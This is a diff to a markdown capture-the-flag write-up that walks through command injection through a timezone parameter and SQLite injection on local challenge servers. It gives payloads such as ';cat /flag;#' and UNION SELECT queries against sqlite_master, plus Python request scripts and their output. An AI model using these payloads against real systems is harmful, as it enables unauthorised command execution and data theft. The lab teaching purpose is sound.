@@ -53,7 +53,7 @@ We can provide `UTC` as the value and see what output it provides.
 ## Request
 http://challenge.localhost/?timezone=UTC
 
-## Resultant Command
+## Resultant command:
 TZ=UTC date
 ```
 
@@ -62,10 +62,10 @@ TZ=UTC date
 Now let's try the same with `MST` as the value.
 
 ```
-## Request
+## Request:
 http://challenge.localhost/?timezone=UTC
 
-## Resultant Command
+## Resultant command:
 TZ=MST date
 ```
 
@@ -80,10 +80,10 @@ As we can see in the third command of both examples and the `Result`, the `date`
 If we provide the `whoami` command with backticks, the shell executes the command within the backticks and substitutes it's result in the 
 
 ```
-## Request
+## Request:
 http://challenge.localhost/?timezone=`whoami`
 
-## Resultant Command
+## Resultant command:
 TZ=`whoami` date
 ```
 
@@ -92,7 +92,7 @@ TZ=`whoami` date
 Once it has the result for the `whoami` command, the shell will substitute the result in the `TZ` variable.
 
 ```
-## Resultant Command
+## Resultant command:
 TZ=root date
 ```
 
@@ -108,10 +108,10 @@ Wed Jun  5 04:12:07 root 2024
 If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.
 
 ```
-## Request
+## Request:
 http://challenge.localhost/?timezone=;whoami;
 
-## Resultant Command
+## Resultant command:
 TZ=;
 root;
 date
@@ -130,10 +130,10 @@ Wed Jun  5 04:20:22 UTC 2024
 If we use the hash `#` character, it comments out everything that comes afterwards.
 
 ```
-## Request
+## Request:
 http://challenge.localhost/?timezone=;whoami;#
 
-## Resultant Command
+## Resultant command
 TZ=;
 root;
 #date    ## The date command is commented out
@@ -149,10 +149,10 @@ root
 Now, we can use all of these concepts to `cat` out the `/flag` file.
 
 ```
-## Request
+## Request:
 http://challenge.localhost/?timezone=;cat /flag;#
 
-## Resultant Command
+## Resultant command:
 TZ=;
 cat /flag;
 #date    ## The date command is commented out
@@ -298,12 +298,13 @@ password: flag
 The resultant SQL query will be:
 
 ```
+## Resultant query:
 SELECT rowid, * FROM users WHERE username = "flag"--" AND password = "flag"
 
 ## Queried part:
 SELECT rowid, * FROM users WHERE username = "flag"
 
-## Commented part
+## Commented part:
 " AND password = "flag"
 ```
 
@@ -333,12 +334,13 @@ password: flag" OR 1-1--
 The resultant SQL query will be:
 
 ```
+## Resultant query:
 SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag" OR 1-1--"
 
 ## Queried part:
 SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag" OR 1-1
 
-## Commented part
+## Commented part:
 "
 ```
 
@@ -390,18 +392,19 @@ However, since our user input is being directly inserted within the query withou
 If we provide the following parameter:
 
 ```
-query": 'flag" UNION SELECT password FROM users --
+"query": 'flag" UNION SELECT password FROM users --'
 ```
 
 The resultant SQL query will be:
 
 ```
+## Resultant query:
 SELECT username FROM users WHERE username LIKE "flag" UNION SELECT password FROM users --"
 
 ## Queried part:
 SELECT username FROM users WHERE username LIKE "flag" UNION SELECT password FROM users
 
-## Commented part
+## Commented part:
 "
 ```
 
@@ -438,9 +441,125 @@ def level6():
 
 This level creates the table using the hash of the flag. This means that the table name is randomly generated.
 
-In order to retrieve the flag, we frost need to retrieve the table name.
+## SQL Injection
 
-#### Listing the tables present
+In order to retrieve the flag, we first need to retrieve the table name. We can refer this [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) list.
 
-We know that the dtabase used is SQLite.
-In SQLite, the `sqlite_master`
+#### Retrieving SQLite version
+
+The SQLite version can be retrieved using the following query:
+
+```
+select sqlite_version();
+```
+
+If we provide the following request:
+
+```
+"query": '" UNION SELECT sqlite_version(); --'
+```
+
+The resultant query will be:
+
+```
+## Resultant query:
+SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sqlite_version(); --"
+
+## Queried part:
+SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sqlite_version();
+
+## Commented part:
+"
+```
+
+```py
+import requests
+
+params={
+	"query": '" UNION SELECT sqlite_version(); --'
+}
+
+response = requests.get("http://challenge.localhost/", params = params)
+print(response.text)
+```
+```
+3.31.1
+```
+
+#### Listing the tables
+
+For SQLite verions `3.33.0` and previous, the `sqlite_master` master contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.
+
+```
+SELECT sql FROM sqlite_master
+```
+
+If we provide the following request:
+
+```
+"query": '" UNION SELECT sql FROM sqlite_master --'
+```
+
+The resultant query will be:
+
+```
+## Resultant query:
+SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sql FROM sqlite_master --"
+
+## Queried part:
+SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sql FROM sqlite_master
+
+## Commented part:
+"
+```
+
+```py
+import requests
+
+params={
+	"query": '" UNION SELECT sql FROM sqlite_master --'
+}
+
+response = requests.get("http://challenge.localhost/", params = params)
+print(response.text)
+```
+```
+CREATE TABLE table2652065454664187289(
+  username,
+  password
+)
+```
+
+#### Retrieving the password
+
+Now that we know the table name is `table2652065454664187289``, we can easily retrieve the password from the table.
+
+If we provide the following request:
+
+```
+"query": '" UNION SELECT password FROM table2652065454664187289 --'
+```
+
+The resultant query will be:
+
+```
+## Resultant query:
+SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT password FROM table2652065454664187289 --"
+
+## Queried part:
+SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT password FROM table2652065454664187289
+
+## Commented part:
+"
+```
+
+```py
+import requests
+
+params={
+	"query": '" UNION SELECT password FROM table2652065454664187289 --'
+}
+
+response = requests.post("http://challenge.localhost/", params = params)
+print(response.text)
+```
